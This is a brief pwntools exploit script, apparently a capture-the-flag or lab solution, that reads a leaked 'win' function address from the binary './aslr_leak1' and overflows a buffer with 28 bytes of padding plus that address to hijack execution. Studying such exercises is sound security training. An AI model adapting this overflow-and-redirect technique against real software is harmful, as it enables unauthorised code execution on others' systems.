from pwn import *
import struct
p = process("./aslr_leak1")
p.recvuntil("Win Func @ ")
win_func = int(p.recvline().strip(),16)

payload = "A"*28 + struct.pack("I",win_func)
p.sendline(payload)

p.interactive()
